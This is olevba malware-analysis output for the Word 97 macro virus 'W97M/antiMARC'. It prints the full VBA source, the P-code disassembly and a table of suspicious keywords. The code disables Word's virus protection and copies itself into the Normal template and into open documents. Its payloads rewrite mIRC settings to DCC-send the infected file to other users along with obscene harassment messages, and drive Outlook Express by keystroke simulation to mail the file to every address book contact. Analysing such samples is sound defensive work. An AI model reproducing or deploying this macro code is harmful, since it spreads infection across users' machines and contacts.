olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antimarc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Antimarc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO antiMARC.bas 
in file: Virus.MSWord.Antimarc - OLE stream: 'Macros/VBA/antiMARC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub antiMARC()
'W97M/antiMARC by Lord Natas [Codebreakers 98]
'with special thanks to Rhape79
'"We're just the toys in the hands of another"
On Error Resume Next
Application.EnableCancelKey = 0
Application.DisplayAlerts = 0
WordBasic.DisableAutoMacros = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.SavePropertiesPrompt = 0
Options.ConfirmConversions = 0
WinDir = Environ("WINDIR") & "\"
Application.VBE.ActiveVBProject.VBComponents("antiMARC").Export WinDir & "system\microsof.386"
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "antiMARC" Then a = -1
Next i
For J = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(J).Name = "antiMARC" Then b = -1
Next J
If a = 0 Then
NormalTemplate.VBProject.VBComponents.Import WinDir & "system\microsof.386"
NormalTemplate.Save
End If
If b = 0 Then
ActiveDocument.VBProject.VBComponents.Import WinDir & "system\microsof.386"
If Left(ActiveDocument.Name, 8) <> "Document" And Left(ActiveDocument.Name, 8) <> "Template" Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
End If
randomize
If Int(Rnd() * 1024) = 666 Then Call mIRCDropper
If Int(Rnd() * 1024) = 666 + 6 Then Call OE
End Sub
Private Sub mIRCDropper()
On Error Resume Next
If Dir("C:\mirc\mirc32.exe") = "" Then GoTo NomIRC
m = System.PrivateProfileString("C:\mirc\mirc.ini", "warn", "fserve")
If m <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "warn", "fserve") = "off"
m = System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "Warning")
If m <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "Warning") = "Off"
Open "C:\mirc\script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=on 1:CONNECT: {"
Print #1, "n1=/msg marc FuCk YoU FaScIsT"
Print #1, "n2=/msg warblade STILL SUCKING MARC's COCK?? eh, sure you do!!"
Print #1, "n3=/msg super Hey M0therfux0r, shove X/W up yer fat pimple-covered ass!"
Print #1, "n4=/msg super 'We do not support the distribution of virii' - i guess you do now, bitch!"
Print #1, "n5=/msg #gotinfected777 Kick Me! - I'm InFeCtEd!"
Print #1, "n6=}"
Print #1, "n7=on 1:JOIN:#: if ( $me != $nick) { /dcc send $nick c:\windows\xxxpasswords.doc }"
Print #1, "n8=on 1:TEXT:*marcsux*:#: {"
Print #1, "n9=/ctcp $nick X"
Print #1, "n10=/msg #gotinfected777 X"
Print #1, "n11=}"
Print #1, "n12=on 1:TEXT:marcisalamer*:?:{ s *2 | halt }"
Print #1, "n13=alias /s / *1"
Close #1
ActiveDocument.Save
ActiveDocument.SaveAs FileName:="c:\windows\xxxpasswords.doc", AddToRecentFiles:=False
Application.Quit SaveChanges:=wdDoNotSaveChanges
NomIRC:
End Sub
Private Sub OE()
On Error Resume Next
For i = 1 To 8
randomize
Temp = Temp + Chr$(Int(Rnd() * (90 - 65) + 65))
Next
sName = "C:\" + Temp + ".DOC"
ActiveDocument.SaveAs FileName:=sName
For Each myTask In Tasks
If InStr(myTask.Name, "Address Book") > 0 Then
myTask.Activate (0)
Call Delay
GoTo NextShit
End If
Next myTask
oeFile = "C:\Program Files\Outlook Express\wab.exe"
If Dir(oeFile) <> "" Then
Shell oeFile, 4
GoTo NextShit
End If
GoTo NoOE
NextShit:
t = "Address Book - (C:\WINDOWS\Application Data\Microsoft\Address Book\UserMPS.wab)"
loop1:
If Tasks.Exists(t) = False Then GoTo loop1
Call Delay
SendKeys "{TAB}", -1
SendKeys "+({DOWN 20})", -1
SendKeys "%T", -1
SendKeys "M", -1
loop2:
If Tasks.Exists("New Message") = False Then GoTo loop2
Call Delay
SendKeys "{TAB}", -1
SendKeys "{TAB}", -1
SendKeys "{TAB}", -1
randomize
For i = 1 To Int(Rnd() * (35 - 1) + 1)
If Rnd() < Rnd() Then
R = R + Chr$(Int(Rnd() * (122 - 97) + 97))
Else
R = R + Chr$(Int(Rnd() * (90 - 65) + 65))
End If
Next
SendKeys R, -1
Call Delay
SendKeys "%I", -1
SendKeys "A", -1
SendKeys sName, -1
SendKeys "{ENTER}", -1
SendKeys "{TAB}", -1
SendKeys "J97Z/nagvZNEP ol Ybeq Angnf [Pbqroernxref 98]", -1
SendKeys "%S", -1
NoOE:
End Sub
Private Sub Delay()
For i = 1 To 666
F
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Antimarc
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1051 bytes
' Error: unpack_from requires a buffer of at least 1667591331 bytes for unpacking 2 bytes at offset 1667591329 (actual buffer size is 1051).
' Macros/VBA/antiMARC - 7957 bytes
' Line #0:
' 	FuncDefn (Sub antiMARC())
' Line #1:
' 	QuoteRem 0x0000 0x002D "W97M/antiMARC by Lord Natas [Codebreakers 98]"
' Line #2:
' 	QuoteRem 0x0000 0x001E "with special thanks to Rhape79"
' Line #3:
' 	QuoteRem 0x0000 0x002D ""We're just the toys in the hands of another""
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	MemSt DisableAutoMacros 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #11:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #12:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St WinDir 
' Line #13:
' 	Ld WinDir 
' 	LitStr 0x0013 "system\microsof.386"
' 	Concat 
' 	LitStr 0x0008 "antiMARC"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #15:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "antiMARC"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St a 
' 	EndIf 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	Ld J 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "antiMARC"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St B 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	Ld a 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	Ld WinDir 
' 	LitStr 0x0013 "system\microsof.386"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #22:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Ld B 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld WinDir 
' 	LitStr 0x0013 "system\microsof.386"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #26:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Template"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #27:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	ArgsCall Read 0x0000 
' Line #31:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0400 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x029A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) mIRCDropper 0x0000 
' 	EndIf 
' Line #32:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0400 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x029A 
' 	LitDI2 0x0006 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) OE 0x0000 
' 	EndIf 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Private Sub mIRCDropper())
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	LitStr 0x0012 "C:\mirc\mirc32.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NomIRC 
' 	EndIf 
' Line #37:
' 	LitStr 0x0010 "C:\mirc\mirc.ini"
' 	LitStr 0x0004 "warn"
' 	LitStr 0x0006 "fserve"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St m 
' Line #38:
' 	Ld m 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "off"
' 	LitStr 0x0010 "C:\mirc\mirc.ini"
' 	LitStr 0x0004 "warn"
' 	LitStr 0x0006 "fserve"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #39:
' 	LitStr 0x0010 "C:\mirc\mirc.ini"
' 	LitStr 0x000A "fileserver"
' 	LitStr 0x0007 "Warning"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St m 
' Line #40:
' 	Ld m 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "Off"
' 	LitStr 0x0010 "C:\mirc\mirc.ini"
' 	LitStr 0x000A "fileserver"
' 	LitStr 0x0007 "Warning"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #41:
' 	LitStr 0x0012 "C:\mirc\script.ini"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "[script]"
' 	PrintItemNL 
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "n0=on 1:CONNECT: {"
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "n1=/msg marc FuCk YoU FaScIsT"
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003E "n2=/msg warblade STILL SUCKING MARC's COCK?? eh, sure you do!!"
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "n3=/msg super Hey M0therfux0r, shove X/W up yer fat pimple-covered ass!"
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0058 "n4=/msg super 'We do not support the distribution of virii' - i guess you do now, bitch!"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "n5=/msg #gotinfected777 Kick Me! - I'm InFeCtEd!"
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "n6=}"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0052 "n7=on 1:JOIN:#: if ( $me != $nick) { /dcc send $nick c:\windows\xxxpasswords.doc }"
' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "n8=on 1:TEXT:*marcsux*:#: {"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "n9=/ctcp $nick X"
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "n10=/msg #gotinfected777 X"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "n11=}"
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "n12=on 1:TEXT:marcisalamer*:?:{ s *2 | halt }"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "n13=alias /s / *1"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #58:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #59:
' 	LitStr 0x001B "c:\windows\xxxpasswords.doc"
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #60:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' Line #61:
' 	Label NomIRC 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Private Sub OE())
' Line #64:
' 	OnError (Resume Next) 
' Line #65:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	For 
' Line #66:
' 	ArgsCall Read 0x0000 
' Line #67:
' 	Ld Temp 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Temp 
' Line #68:
' 	StartForVariable 
' 	Next 
' Line #69:
' 	LitStr 0x0003 "C:\"
' 	Ld Temp 
' 	Add 
' 	LitStr 0x0004 ".DOC"
' 	Add 
' 	St sName 
' Line #70:
' 	Ld sName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #71:
' 	StartForVariable 
' 	Ld myTask 
' 	EndForVariable 
' 	Ld Tasks 
' 	ForEach 
' Line #72:
' 	Ld myTask 
' 	MemLd New 
' 	LitStr 0x000C "Address Book"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #73:
' 	LitDI2 0x0000 
' 	Paren 
' 	Ld myTask 
' 	ArgsMemCall Activate 0x0001 
' Line #74:
' 	ArgsCall (Call) Delay 0x0000 
' Line #75:
' 	GoTo NextShit 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	StartForVariable 
' 	Ld myTask 
' 	EndForVariable 
' 	NextVar 
' Line #78:
' 	LitStr 0x0028 "C:\Program Files\Outlook Express\wab.exe"
' 	St oeFile 
' Line #79:
' 	Ld oeFile 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #80:
' 	Ld oeFile 
' 	LitDI2 0x0004 
' 	ArgsCall Shell 0x0002 
' Line #81:
' 	GoTo NextShit 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	GoTo NoOE 
' Line #84:
' 	Label NextShit 
' Line #85:
' 	LitStr 0x004F "Address Book - (C:\WINDOWS\Application Data\Microsoft\Address Book\UserMPS.wab)"
' 	St t 
' Line #86:
' 	Label loop1 
' Line #87:
' 	Ld t 
' 	Ld Tasks 
' 	ArgsMemLd Exists 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo loop1 
' 	EndIf 
' Line #88:
' 	ArgsCall (Call) Delay 0x0000 
' Line #89:
' 	LitStr 0x0005 "{TAB}"
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #90:
' 	LitStr 0x000C "+({DOWN 20})"
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #91:
' 	LitStr 0x0002 "%T"
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #92:
' 	LitStr 0x0001 "M"
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #93:
' 	Label loop2 
' Line #94:
' 	LitStr 0x000B "New Message"
' 	Ld Tasks 
' 	ArgsMemLd Exists 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo loop2 
' 	EndIf 
' Line #95:
' 	ArgsCall (Call) Delay 0x0000 
' Line #96:
' 	LitStr 0x0005 "{TAB}"
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #97:
' 	LitStr 0x0005 "{TAB}"
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #98:
' 	LitStr 0x0005 "{TAB}"
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #99:
' 	ArgsCall Read 0x0000 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0023 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	For 
' Line #101:
' 	ArgsLd Rnd 0x0000 
' 	ArgsLd Rnd 0x0000 
' 	Lt 
' 	IfBlock 
' Line #102:
' 	Ld R 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x007A 
' 	LitDI2 0x0061 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St R 
' Line #103:
' 	ElseBlock 
' Line #104:
' 	Ld R 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St R 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	StartForVariable 
' 	Next 
' Line #107:
' 	Ld R 
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #108:
' 	ArgsCall (Call) Delay 0x0000 
' Line #109:
' 	LitStr 0x0002 "%I"
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #110:
' 	LitStr 0x0001 "A"
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #111:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #112:
' 	LitStr 0x0007 "{ENTER}"
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #113:
' 	LitStr 0x0005 "{TAB}"
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #114:
' 	LitStr 0x002D "J97Z/nagvZNEP ol Ybeq Angnf [Pbqroernxref 98]"
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #115:
' 	LitStr 0x0002 "%S"
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall SendKeys 0x0002 
' Line #116:
' 	Label NoOE 
' Line #117:
' 	EndSub 
' Line #118:
' 	FuncDefn (Private Sub Delay())
' Line #119:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x029A 
' 	For 
' Line #120:
' 	ArgsCall False 0x0000 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |wab.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

